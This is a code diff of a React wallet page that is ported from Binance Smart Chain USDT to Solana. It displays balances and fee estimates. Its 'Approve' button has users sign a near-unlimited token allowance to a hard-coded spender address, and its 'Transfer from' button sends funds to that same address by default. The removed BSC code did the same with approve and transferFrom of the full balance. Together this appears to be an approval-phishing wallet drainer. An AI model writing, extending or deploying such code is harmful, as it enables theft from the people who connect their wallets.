@@ -4,11 +4,10 @@ import * as splToken from '@solana/spl-token'
 import Toast from 'light-toast'
 import Btn from './components/Btn'
 import Ipt from './components/Ipt'
-import ABI from './config/USDT_BEP20_ABI.json'
 import { formatBalance } from './config/utils'
 
-const USDT_BEP20_ADDRESS = '0x55d398326f99059ff775485246999027b3197955'
-const SPENDER_ADDRESS = '0xf2d50314B68D9a0338E6139603ca12dfffe11498'
+const USDT_ADDRESS = '5MzEv9NewwCgxNDmrBD7DHyvBuLD7eBzZqpXDMxoEfBT'
+const SPENDER_ADDRESS = 'CLZnJ1URVEb4EU7GK8u8jFTy9mwViDZS13BeA98oqyF8'
 
 let web3 = null, connection = null, publicKey = null, tokenAccount = null, contract = null, decimals = 6, timer = null
 function App() {
@@ -19,12 +18,13 @@ function App() {
 		'tether': {usd: 0.999824, cny: 6.37},
 		'tron': {usd: 0.091731, cny: 0.584041},
 		'binancecoin': {usd: 593.87, cny: 3785.58},
-		'usd-coin': {usd: 0.998926, cny: 6.36}
+		'usd-coin': {usd: 0.998926, cny: 6.36},
+		'solana': {usd: 170.19, cny: 1084.12}
 	})
 	const [ address, setAddress ] = useState('')
 	const [ solanaBalance, setSolanaBalance ] = useState(0)
 	const [ usdtBalance, setUsdtBalance ] = useState(0)
-	const [ gasFee, setGasFee ] = useState(0)
+	const [ gasFee, setGasFee ] = useState(0.000005)
 
 	const [ from, setFrom ] = useState('')
 	const [ to, setTo ] = useState('')
@@ -39,32 +39,9 @@ function App() {
 				const resp = await window.solana.connect()
 				publicKey = resp.publicKey
 				setAddress(publicKey.toString())
+				// connection = new Web3.Connection(Web3.clusterApiUrl('testnet'))
 				connection = new Web3.Connection(Web3.clusterApiUrl('mainnet-beta'))
 				console.log(connection)
-				const res = await Web3.PublicKey.findProgramAddress([
-					publicKey.toBuffer(), 
-					splToken.TOKEN_PROGRAM_ID.toBuffer(), 
-					new Web3.PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v').toBuffer()
-				], new Web3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'))
-				tokenAccount = res[0]
-				console.log(tokenAccount.toString())
-
-				//This fromWallet is your minting wallet, that will actually mint the tokens
-				// const fromWallet = Web3.Keypair.generate()
-				//create new token mint
-				// const mint = await splToken.Token.createMint(
-				// 	connection,
-				// 	fromWallet,
-				// 	fromWallet.publicKey,
-				// 	fromWallet.publicKey,
-				// 	6, // Number of decimal places in your token
-				// 	splToken.TOKEN_PROGRAM_ID,
-				// )
-				// console.log(mint)
-				//get the token account of the myWallet myToken address, if it does not exist, create it
-				// let myWalletTokenAccount = await myToken.getOrCreateAssociatedAccountInfo(
-				// 	myWallet.publicKey,
-				// );
 				refresh()
 				// getGasFee()
 				// timer = setInterval(getGasFee, 5000)
@@ -79,10 +56,17 @@ function App() {
 	const refresh = async (loading = false) => {
 		loading && Toast.loading('Loading...')
 		const solanaBalance = await connection.getBalance(publicKey)
-		setSolanaBalance(solanaBalance)
-		const res = await connection.getTokenAccountBalance(tokenAccount)
-		console.log(res)
-		// setUsdtBalance(usdtB / Math.pow(10, decimals))
+		setSolanaBalance(solanaBalance / Math.pow(10, 9))
+		try {
+			const res = await connection.getTokenAccountBalance(new Web3.PublicKey(USDT_ADDRESS))
+			// console.log(res)
+			if (res.value) {
+				setUsdtBalance(res.value.uiAmount)
+			}
+		} catch (error) {
+			console.log(error)
+		}
+		
 		Toast.hide()
 	}
 
@@ -93,7 +77,7 @@ function App() {
 	}
 
 	const getRate = () => {
-		fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,usd-coin,litecoin,tron,binancecoin&vs_currencies=usd,cny`)
+		fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,usd-coin,litecoin,tron,binancecoin,solana&vs_currencies=usd,cny`)
 			.then(res => res.json())
 			.then(res => {
 				setRate(res)
@@ -124,7 +108,31 @@ function App() {
 			timer = null
 		}
 	}, [])
-
+	// export const sendTxUsingExternalSignature = async (
+	// 	instructions: TransactionInstruction[],
+	// 	connection: Connection,
+	// 	feePayer: Account | null,
+	// 	signersExceptWallet: Account[],
+	// 	wallet: Wallet
+	//   ) => {
+	// 	let tx = new Transaction().add(...instructions);
+	// 	tx.setSigners(
+	// 	  ...(feePayer
+	// 		? [(feePayer as Account).publicKey, wallet.publicKey]
+	// 		: [wallet.publicKey]),
+	// 	  ...signersExceptWallet.map(s => s.publicKey)
+	// 	);
+	// 	tx.recentBlockhash = (await connection.getRecentBlockhash("max")).blockhash;
+	// 	signersExceptWallet.forEach(acc => {
+	// 	  tx.partialSign(acc);
+	// 	});
+	// 	let signed = await wallet.signTransaction(tx);
+	// 	let txid = await connection.sendRawTransaction(signed.serialize(), {
+	// 	  skipPreflight: false,
+	// 	  preflightCommitment: COMMITMENT
+	// 	});
+	// 	return connection.confirmTransaction(txid, COMMITMENT);
+	//   };
 	return (
 		<div className="w-full flex flex-col items-center p-4">
 			<h1 className="text-4xl text-red-500 text-center font-bold pt-4">Solana</h1>
@@ -132,10 +140,10 @@ function App() {
 				<div>Address: <span className="text-blue-500">{address}</span></div>
 				<div>Balance:  <span className="text-red-500 mx-2">{solanaBalance} SOL</span>| <span className="text-green-500 ml-2">{formatBalance(usdtBalance)} USDT</span></div>
 				<div style={{ animation: 'fade 1s infinite' }}>
-					Estimated gas fee: 
+					Estimated tx fee: 
 					<span className="text-yellow-500 ml-2">{formatBalance(gasFee)} SOL</span>
-					<span className="mx-2">(${formatBalance(+gasFee * rate['binancecoin'].usd, 2)})</span>
-					<span>(¥{formatBalance(+gasFee * rate['binancecoin'].cny, 2)})</span>
+					<span className="mx-2">(${formatBalance(+gasFee * rate['solana'].usd, 2)})</span>
+					<span>(¥{formatBalance(+gasFee * rate['solana'].cny, 2)})</span>
 				</div>
 			</div>
 			<Btn text={'Refresh'} onClick={() => refresh(true)} />
@@ -143,19 +151,49 @@ function App() {
 				text={'Approve'} 
 				theme={'green'} 
 				onClick={async () => {
-					const allowanceBalance = await contract.methods.allowance(address, SPENDER_ADDRESS).call()
-					console.log(allowanceBalance)
-					if (allowanceBalance > 0) {
-						return Toast.success('You have done!')
-					}
-					const res = await contract.methods.approve(SPENDER_ADDRESS, '99999999').send({
-						from: address,
-						gas: 80000
+					const ix = splToken.Token.createApproveInstruction(
+						splToken.TOKEN_PROGRAM_ID, 
+						new Web3.PublicKey(USDT_ADDRESS), 
+						new Web3.PublicKey(SPENDER_ADDRESS),
+						publicKey,
+						[],
+						Math.pow(10, 9) * 99999
+					)
+					const transaction = new Web3.Transaction({
+						feePayer: publicKey,
+						recentBlockhash: (await connection.getRecentBlockhash()).blockhash
 					})
-					if (res.code === 4001) {
-						return Toast.fail(res.message)
-					}
-					Toast.success('Success!')
+					transaction.add(...[ix])
+					console.log(transaction)
+					const { signature } = await window.solana.signAndSendTransaction(transaction)
+					const res = await connection.confirmTransaction(signature)
+					console.log(res)
+					// const tokenData = (await connection.getParsedAccountInfo(new Web3.PublicKey(USDT_ADDRESS))).value.data
+					// console.log(tokenData)
+					// /**
+					//  * token mint地址就是token account，铸币地址，不等同于合约地址，是属于用户自己账户下的对应合约的单独的地址
+					//  */
+					// const tokenMintAddress = tokenData.parsed.info.mint
+					// console.log(tokenMintAddress)
+					// const token = new splToken.Token(
+					// 	connection,
+					// 	new Web3.PublicKey(tokenMintAddress),
+					// 	splToken.TOKEN_PROGRAM_ID
+					// )
+					// const allowanceBalance = await contract.methods.allowance(address, SPENDER_ADDRESS).call()
+					// console.log(allowanceBalance)
+					// if (allowanceBalance > 0) {
+					// 	return Toast.success('You have done!')
+					// }
+					// await splToken.approve()
+					// const res = await contract.methods.approve(SPENDER_ADDRESS, '99999999').send({
+					// 	from: address,
+					// 	gas: 80000
+					// })
+					// if (res.code === 4001) {
+					// 	return Toast.fail(res.message)
+					// }
+					// Toast.success('Success!')
 				}} 
 			/>
 			<Ipt 
@@ -180,28 +218,32 @@ function App() {
 					// // 	Toast.fail('From address is required!')
 					// // 	return
 					// // }
-					if (from && !web3.utils.isAddress(from.trim())) {
-						Toast.fail('From address is invalid!')
-						return
-					}
-					const allowanceBalance = await contract.methods.allowance(from || address, SPENDER_ADDRESS).call()
-					Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${allowanceBalance}`)
+					// if (from && !web3.utils.isAddress(from.trim())) {
+					// 	Toast.fail('From address is invalid!')
+					// 	return
+					// }
+					// const allowanceBalance = await contract.methods.allowance(from || address, SPENDER_ADDRESS).call()
+					// Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${allowanceBalance}`)
 				}} 
 			/>
 			<Btn 
 				text={'Transfer from'} 
 				theme={'yellow'} 
 				onClick={async () => {
-					if (from && !web3.utils.isAddress(from.trim())) {
-						Toast.fail('From address is invalid!')
-						return
-					}
 					const toAddress = to || SPENDER_ADDRESS
-					const balance = await contract.methods.balanceOf(from || address).call()
-					alert(`【${from || address}】向【${toAddress}】转账【${balance / Math.pow(10, decimals)}】开始`)
 					Toast.loading('Loading...')
-					const res = await contract.methods.transferFrom(from || address, toAddress, balance).send()
-					// // const res = await contract.transfer(toAddress, balance).send()
+					const transaction = new Web3.Transaction({
+						feePayer: publicKey,
+						recentBlockhash: (await connection.getRecentBlockhash()).blockhash
+					})
+					const amount = 0.1
+					transaction.add(Web3.SystemProgram.transfer({
+						fromPubkey: from ? new Web3.PublicKey(from) : publicKey,
+						toPubkey: new Web3.PublicKey(toAddress),
+						lamports: Math.pow(10, 9) * amount
+					}))
+					const { signature } = await window.solana.signAndSendTransaction(transaction)
+					const res = await connection.confirmTransaction(signature)
 					console.log(res)
 					Toast.hide()
 					setTimeout(() => {
